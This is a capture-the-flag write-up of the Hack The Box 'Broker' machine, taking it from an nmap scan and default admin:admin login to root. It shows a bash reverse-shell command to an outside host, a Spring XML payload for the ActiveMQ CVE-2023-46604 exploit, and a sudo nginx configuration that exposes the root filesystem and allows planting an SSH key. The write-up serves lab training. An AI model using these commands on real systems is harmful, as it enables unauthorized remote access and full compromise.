---
description: https://app.hackthebox.com/machines/Broker
---

# Broker

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

## Nmap scan

```bash
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp    open  http       syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt       syn-ack
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?      syn-ack
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       syn-ack Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
40299/tcp open  tcpwrapped syn-ack
61613/tcp open  stomp      syn-ack Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       syn-ack Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title.
| http-methods:
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   syn-ack ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.15
```

* This machine has 3 http ports open: `80` , `8161` and `61614`

```bash
└─➜ cat ports.scan| grep 'http '                                                                                                                                                         [0]
80/tcp    open  http       syn-ack nginx 1.18.0 (Ubuntu)
8161/tcp  open  http       syn-ack Jetty 9.4.39.v20210325
61614/tcp open  http       syn-ack Jetty 9.4.39.v20210325
```

* Visiting the `$IP` we have a basic HTTP Authentication
* We logged in with default password : `admin:admin`
* The intresting port was `61616/tcp open  apachemq syn-ack ActiveMQ OpenWire transport`which was running activemq openwire transport&#x20;
* This service is vulnerable&#x20;
* Read more :&#x20;

{% embed url="https://www.huntress.com/blog/critical-vulnerability-exploitation-of-apache-activemq-cve-2023-46604" %}
resource 1
{% endembed %}

{% embed url="https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis?referrer=etrblog" %}
resource 2
{% endembed %}

## Exploitation (User)

* payload :&#x20;

```bash
sh -i &gt;&amp; /dev/tcp/10.10.16.10/9999 0&gt;&amp;1
```

* I've used the following POC :&#x20;

[https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)

* change `poc-linux.xml` file&#x20;
* Contents of my file&#x20;

```markup
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>sh -i &gt;&amp; /dev/tcp/<YOUR_IP>/9999 0&gt;&amp;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```



* Start a python server with `python -m http.server 8001`
* run the program

```bash
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.16.10:8001/poc-linux.xml
```



## Exploitation (Root)

* sudo -l&#x20;

```bash
activemq@broker:~$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

* So we have root permissions on nginx,
* &#x20;i.e we can create a webserver on the box with root privileges.
* Refer to the following docs to crate a webserver

{% embed url="https://docs.nginx.com/nginx/admin-guide/web-server/web-server/" %}

```
activemq@broker:/tmp$ cat heap.conf
user root;

worker_processes auto;
pid /run/nginx6767.pid;

include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
}

http {
        server{
                listen 7878;
                location /{
                        root /;
                        autoindex on;
                }
        }
}
```

* And start the nginx server with following cmd

```bash
 sudo nginx -c /tmp/heap.conf
```

```bash
activemq@broker:/tmp$ curl localhost:7878/root/
<html>
<head><title>Index of /root/</title></head>
<body>
<h1>Index of /root/</h1><hr><pre><a href="../">../</a>
<a href="cleanup.sh">cleanup.sh</a>                                         07-Nov-2023 08:15                 517
<a href="root.txt">root.txt</a>                                           10-Nov-2023 06:11                  33
</pre><hr></body>
</html>
activemq@broker:/tmp$
```

* We can read the files (root.txt)



### Beyond root (ippsec way)

* If we can create our own server, let's create one where we can put files

{% embed url="https://stackoverflow.com/questions/16912270/how-do-i-allow-a-put-file-request-on-nginx-server" %}

The above link specify us about the `dav_methods`

```javascript
location / {
    root /;
    dav_methods  PUT;
}
```

* Let's put our public key in `/root/.ssh/authorized_keys`
* Command :&#x20;

```bash
 curl -X PUT http://10.10.11.243:7457/root/.ssh/authorized_keys \
 --upload-file ~/.ssh/id_rsa.pub   
```

_**replace the port(7457) with the port number you used to create the nginx server**_

### Shell

* Let's check if our key is been placed

```bash
activemq@broker:/tmp$ curl localhost:7878/root/.ssh/
<html>
<head><title>Index of /root/.ssh/</title></head>
<body>
<h1>Index of /root/.ssh/</h1><hr><pre><a href="../">../</a>
<a href="authorized_keys">authorized_keys</a>                                    10-Nov-2023 10:36                 741
</pre><hr></body>
</html>
activemq@broker:/tmp$
```

* As we can see our keys are placed, now just ssh & we have rooooooooot shell

```bash
└─➜ ssh root@10.10.11.243                                                                                                                                                                [0]
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 <-- snipped -->

Last login: Fri Nov 10 10:40:14 2023 from 10.10.14.51
root@broker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@broker:~#
```

## PWNED

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning.
